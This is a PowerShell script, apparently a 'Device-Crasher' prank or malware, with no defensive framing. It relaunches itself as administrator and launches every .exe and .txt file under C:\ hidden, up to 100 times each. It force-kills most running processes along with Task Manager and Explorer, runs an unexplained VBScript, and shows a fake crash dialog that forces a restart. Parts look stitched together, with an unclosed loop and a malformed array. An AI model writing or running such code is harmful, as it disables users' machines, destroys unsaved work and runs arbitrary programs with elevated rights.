# Loop 20 times
# Check if running as admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Host "Requesting Administrator permissions..."
    # Relaunch script as admin
    Start-Process -FilePath pwsh -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Number of times to open each file
$loopCount = 100

# Drive(s) or base path to search from (use C:\ for full system)
$searchRoot = "C:\"

# File types to open
$fileTypes = @("*.exe", "*.txt")

# Get all files matching types (very heavy!)
$files = @()
foreach ($type in $fileTypes) {
    try {
        $found = Get-ChildItem -Path $searchRoot -Include $type -File -Recurse -ErrorAction SilentlyContinue
        $files += $found
    } catch {
        Write-Host "Error finding files of type $type"
    }
}

# Loop and open each file
for ($i = 1; $i -le $loopCount; $i++) {
    Write-Host "Loop $i of $loopCount — Opening $($files.Count) files"
    foreach ($file in $files) {
        try {
            Start-Process -FilePath $file.FullName -WindowStyle Hidden
        } catch {
            Write-Host "Failed: $($file.FullName)"
        }
    }
}


# Your command to run as admin — example:
Write-Host "Running with Administrator privileges."

# Example: Run errorHandler.vbs silently
Start-Process -FilePath "wscript.exe" -ArgumentList "errorHandler.vbs" -NoNewWindow

# Pause to see output (optional)
Read-Host "Press Enter to exit"



for ($i = 1; $i -le 20; $i++) {
    # Get all .txt and .exe files in current folder
    Get-ChildItem -Path "." -Include *.txt, *.exe -File -Recurse | ForEach-Object {
        try {
            Start-Process $_.FullName
        } catch {
            Write-Host "Failed to open: $($_.FullName)"
        }
    }
}


$folderPath = Get-Location

# Get all .exe and .txt files in current folder
$files = Get-ChildItem -Path $folderPath -Include *.exe, *.txt -File

# Optional: exclude important files like explorer.exe or this script itself
$exclusions = @("explorer.exe", c:/Windows/explorer.exe)
Get-Process | Where-Object { $_.Name -ne "explorer" } | ForEach-Object { Stop-Process -Id $_.Id -Force }


for ($i = 1; $i -le 20; $i++) {
    foreach ($file in $files) {
        if ($exclusions -notcontains $file.Name.ToLower()) {
            Start-Process -FilePath $file.FullName
        }

}

Start-Process -name "taskmgr"
Stop-Process -name "taskmgr" -Force

Add-Type -AssemblyName System.Windows.Forms

function Open-DeviceCrasher {
    param(
        [string]$BaseLocation
    )

    $fullPath = Join-Path -Path $BaseLocation -ChildPath "Device-Crasher"
    Write-Host "Checking folder at: $fullPath"

    if (Test-Path $fullPath) {
        Write-Host "Folder found. Opening..."
        Start-Process "explorer.exe" -ArgumentList "`"$fullPath`""
        return $true
    }
    else {
        Write-Host "Folder not found at $fullPath"
        return $false
    }
}

# Default location (can be anywhere, e.g. Desktop)
$Location = "$env:USERPROFILE\Desktop"

# Try to open Device-Crasher at default location
$opened = Open-DeviceCrasher -BaseLocation $Location

if (-not $opened) {
    # Prompt user for a different location
    $newLocation = [System.Windows.Forms.MessageBox]::Show(
        "Device-Crasher folder not found at:`n$Location`nWould you like to select a different folder?",
        "Folder Not Found",
        [System.Windows.Forms.MessageBoxButtons]::YesNo,
        [System.Windows.Forms.MessageBoxIcon]::Question
    )

    if ($newLocation -eq [System.Windows.Forms.DialogResult]::Yes) {
        # Open folder browser dialog to select folder
        $folderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog
        $folderBrowser.Description = "Select the base folder containing Device-Crasher"
        $folderBrowser.ShowNewFolderButton = $false

        if ($folderBrowser.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
            $selectedPath = $folderBrowser.SelectedPath
            $opened = Open-DeviceCrasher -BaseLocation $selectedPath

            if (-not $opened) {
                [System.Windows.Forms.MessageBox]::Show(
                    "Device-Crasher folder was not found inside the selected folder.`nExiting.",
                    "Not Found",
                    [System.Windows.Forms.MessageBoxButtons]::OK,
                    [System.Windows.Forms.MessageBoxIcon]::Warning
                )
            }
        }
        else {
            Write-Host "User cancelled folder selection. Exiting."
        }
    }
    else {
        Write-Host "User chose not to select a different folder. Exiting."
    }
}

Stop-Process -name "explorer.exe"

Add-Type -AssemblyName System.Windows.Forms

# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = "System Crash"
$form.Size = New-Object System.Drawing.Size(420, 180)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true

# Label
$label = New-Object System.Windows.Forms.Label
$label.Text = "Your computer is crashed..."
$label.Font = 'Segoe UI,12'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(110, 30)
$form.Controls.Add($label)

# Restart button
$btnRestart = New-Object System.Windows.Forms.Button
$btnRestart.Text = "Restart"
$btnRestart.Size = New-Object System.Drawing.Size(100, 30)
$btnRestart.Location = New-Object System.Drawing.Point(30, 80)
$btnRestart.Add_Click({
    Restart-Computer -Force
})
$form.Controls.Add($btnRestart)

# Sign Out button
$btnSignOut = New-Object System.Windows.Forms.Button
$btnSignOut.Text = "Sign Out"
$btnSignOut.Size = New-Object System.Drawing.Size(100, 30)
$btnSignOut.Location = New-Object System.Drawing.Point(150, 80)
$btnSignOut.Add_Click({
    shutdown.exe /l
})
$form.Controls.Add($btnSignOut)

# "I Don’t Care" button
$btnIdc = New-Object System.Windows.Forms.Button
$btnIdc.Text = "I Don't Care"
$btnIdc.Size = New-Object System.Drawing.Size(100, 30)
$btnIdc.Location = New-Object System.Drawing.Point(270, 80)
$btnIdc.Add_Click({
    $form.Close()
    Start-Sleep -Seconds 3
    Restart-Computer -Force
})
$form.Controls.Add($btnIdc)

# Show the form
$form.ShowDialog()
